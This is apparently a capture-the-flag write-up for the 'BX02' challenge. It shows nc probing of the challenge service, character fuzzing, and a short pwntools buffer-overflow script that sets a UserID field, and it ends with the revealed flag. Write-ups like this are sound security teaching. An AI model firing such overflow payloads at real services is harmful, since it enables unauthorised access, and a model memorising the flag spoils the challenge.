# BX02
> 1,000pts

## Briefing
> Access the network service at url: `cfta-bx02.allyourbases.co` port: `8013` and find a way to get the flag.

## Solution

Connecting to the service gives us this output:

```console
➜ ~ $ nc cfta-bx02.allyourbases.co 8013
Come Fuzz Me Bro.
DEBUG: Waiting 100ms
d
DEBUG: Input length too large.
➜ ~ $ echo "" | nc cfta-bx02.allyourbases.co 8013
Come Fuzz Me Bro.
DEBUG: Waiting 100ms
DEBUG: Input length too large.
➜ ~ $
```

We notice that whatever we give the service, it responds with `DEBUG: Input length too large.` So we try bruteforcing every single character to figure out which input it does *not* reply "too large" with. (This requires some guessing.) After a bruteforce with a pwntools script, we find that the server will not say "too large" with a `#` character. We find that we can spam `#` and the server will not complain. If we spam enough, we get the message `ERROR: Expected UserID of 1`. We now take another guess, and hope that we can use a buffer overflow to make `UserID` equal to `1`. We write a pwntools script:

```Python
from pwn import *

conn = remote("cfta-bx02.allyourbases.co", 8013)

conn.sendline(("#" + "1"*147 + "#")*20)
print(conn.recvall())
```

## Flag
Flag: `ThIsOneIsAbITFuZZy-6y`
